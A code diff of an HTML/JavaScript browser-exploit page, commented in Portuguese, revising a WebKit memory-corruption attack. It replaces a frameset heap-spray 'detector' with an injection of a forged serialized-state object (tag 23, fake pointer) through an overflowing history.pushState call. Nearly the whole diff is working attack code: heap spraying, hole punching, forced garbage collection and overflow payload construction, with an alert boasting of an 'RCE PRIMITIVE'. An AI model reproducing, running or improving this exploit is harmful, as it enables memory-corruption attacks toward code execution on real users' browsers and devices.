@@ -1,107 +1,117 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Frameset Lag Detector</title>
+    <title>SSV Injection: Tag 23 Attack</title>
     <style>
-        body { background-color: #000; color: #00ff00; font-family: monospace; padding: 20px; }
-        button { 
-            font-size: 24px; padding: 20px; width: 100%; border: 2px solid #00ff00; background: #111; color: #fff; cursor: pointer;
-        }
-        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; }
+        body { background-color: #100; color: #f55; font-family: monospace; padding: 20px; }
+        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #f55; background: #000; color: #fff; cursor: pointer; }
+        #log { margin-top: 20px; border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px;}
+        .win { background-color: #f55; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; border: 2px solid white; }
     </style>
 </head>
 <body>
 
-    <h1>Frameset Detector (Memory Spike)</h1>
-    <p>A prova de corrupção será um erro de 'Out Of Memory' ao ler um único objeto.</p>
+    <h1>Ataque Final: Injeção de Tag SSV (23)</h1>
+    <p>Tentando forçar a criação de um ArrayBuffer via deserialização corrompida.</p>
 
-    <button onclick="startLagAttack()">INICIAR DETECTOR</button>
+    <button onclick="startSSVAttack()">INICIAR INJEÇÃO DE TAG</button>
     
     <div id="log">Pronto. Reinicie o console.</div>
 
     <script>
-        const BASE_OFFSET = 709520;
-        const OVERFLOW_AMT = 1024 * 64; 
-
-        // Configuração para 4MB (Alinhamento Large Heap)
-        const TARGET_SIZE_MB = 4;
-        const TARGET_ELEMENTS = (TARGET_SIZE_MB * 1024 * 1024) / 8;
-        const ROWS_STRING = ",".repeat(TARGET_ELEMENTS - 2);
-
-        const SPRAY_COUNT = 60; // Quantidade moderada
-        var victims = [];
+        const BASE_OFFSET = 709520; // Alinhamento exato
+        
+        // Estrutura do Payload Falso (Imitando make_ssv_data do bundle.js)
+        // Precisamos construir isso usando apenas bytes permitidos (< 0x20)
+        // Tag 23 (0x17) é permitido. Version 6 (0x06) é permitido.
+        
+        function buildFakeSSV() {
+            // Cria um buffer pequeno para montar o payload
+            let buf = new Uint8Array(32);
+            
+            // Offset 0: Version (4 bytes) -> 0x00000006
+            buf[0] = 6; 
+            
+            // Offset 4: Tag (1 byte) -> 0x17 (23 - ArrayBufferTransfer)
+            buf[4] = 0x17;
+            
+            // Offset 5-7: Padding/Flags -> 0x00
+            
+            // Offset 8: Pointer (8 bytes). 
+            // Como não podemos escrever bytes altos (ex: 0x41), vamos escrever 0x01.
+            // Isso vai criar o ponteiro 0x0101010101010101.
+            // Se o sistema tentar ler esse endereço, BINGO.
+            for(let i=8; i<16; i++) buf[i] = 1;
+            
+            // Offset 16: Size (4 bytes).
+            // Vamos dizer que o tamanho é pequeno (ex: 0x10 = 16 bytes)
+            buf[16] = 0x10; 
+            
+            return buf;
+        }
 
         function log(msg, type) {
             const el = document.getElementById('log');
-            let color = type === 'win' ? '#0f0' : 'cyan';
-            el.innerHTML += `<div style="color:${color}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
+            let cls = type === 'win' ? 'class="win"' : '';
+            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
             el.scrollTop = el.scrollHeight;
         }
 
-        async function startLagAttack() {
-            log(`1. Alocando ${SPRAY_COUNT} Framesets de 4MB...`);
-
-            // 1. SPRAY
-            for(let i=0; i<SPRAY_COUNT; i++) {
-                let fset = document.createElement('frameset');
-                fset.rows = ROWS_STRING;
-                victims.push(fset);
+        async function startSSVAttack() {
+            log("1. Preparando Payload SSV (Tag 23)...");
+            
+            // Converte o buffer binário para string (Latin-1) para injetar
+            let fakeSSV = buildFakeSSV();
+            let injectionStr = "";
+            for(let i=0; i<fakeSSV.length; i++) {
+                injectionStr += String.fromCharCode(fakeSSV[i]);
             }
 
-            // 2. BURACOS (PSFree Strategy)
-            log("2. Abrindo buracos...");
-            for(let i=0; i<SPRAY_COUNT; i+=2) {
-                victims[i].rows = ""; 
-                victims[i] = null;
-            }
+            // O resto do overflow (padding até o próximo objeto)
+            // Vamos ser conservadores: escrever apenas o cabeçalho
+            let totalOverflow = injectionStr; 
 
+            // Spray para garantir que temos vizinhos (Strings)
+            // Strings são boas vítimas porque o SSV Parser pode tentar ler uma string como objeto SSV
+            log("2. Spray de Strings (Vítimas)...");
+            let victims = [];
+            let pad = "B".repeat(1024*1024); // 1MB Strings
+            for(let i=0; i<100; i++) {
+                victims.push(pad + i);
+            }
+            
+            // Buracos
+            for(let i=0; i<100; i+=2) victims[i] = null;
             await forceGC();
 
-            // 3. EXPLOIT
-            log("3. Disparando Overflow (Corrompendo '_size')...");
+            log("3. Disparando Injeção...");
+
             setTimeout(() => {
                 try {
+                    // Preenche até a borda
                     let buffer = "A".repeat(BASE_OFFSET);
-                    buffer += "\x01".repeat(OVERFLOW_AMT);
+                    // Adiciona nosso SSV falso no lugar do vizinho
+                    buffer += injectionStr;
                     
-                    history.pushState({}, "pwn", "/" + buffer);
+                    // Adiciona um pouco de lixo 0x01 depois só pra garantir
+                    buffer += "\x01".repeat(100);
 
-                    log("4. Sondando vítimas (Procurando OOM)...");
-                    probeVictims();
+                    // A Mágica: Passamos um objeto de estado que vai ser lido DE VOLTA
+                    // Mas esperamos que o overflow corrompa a leitura do PRÓXIMO objeto
+                    history.pushState({}, "ssv_pwn", "/" + buffer);
+
+                    log("4. Verificando estabilidade...");
+                    
+                    // Tenta ler o state de volta. 
+                    // Se corrompemos a estrutura interna, o navegador pode tentar materializar
+                    // o nosso ArrayBuffer falso e travar ao acessar 0x0101...
+                    let s = history.state;
+                    log("Estado lido. Se você vê isso, não travou imediatamente.");
 
                 } catch (e) {
-                    log("Erro no Exploit: " + e.message);
+                    log("Erro: " + e.message);
                 }
             }, 500);
-        }
-
-        function probeVictims() {
-            // Varre os sobreviventes
-            for(let i=1; i<victims.length; i+=2) {
-                let fset = victims[i];
-                if(!fset) continue;
-
-                try {
-                    // Tenta ler .rows
-                    // Se o objeto estiver normal, isso é rápido e retorna uma string de 4MB.
-                    // Se estiver CORROMPIDO (size = 0x01... = Petabytes), o WebKit vai tentar
-                    // alocar Petabytes de string e falhar com erro.
-                    
-                    let temp = fset.rows;
-                    
-                    // Se chegou aqui, leu normal (não foi corrompido)
-                    // (Opcional: checar length se não for custoso)
-                    
-                } catch(e) {
-                    // SE DER ERRO AQUI, É SUCESSO!
-                    // O erro será algo como "Out of memory" ou "String too long"
-                    log(`!!! SUCESSO !!! Vítima ${i} gerou erro ao ler!`, 'win');
-                    log(`Erro capturado: ${e.message}`, 'win');
-                    alert("RCE PRIMITIVE: FRAMESET SIZE CORRUPTED!");
-                    return;
-                }
-            }
-            log("Nenhuma anomalia detectada.");
         }
 
         async function forceGC() {
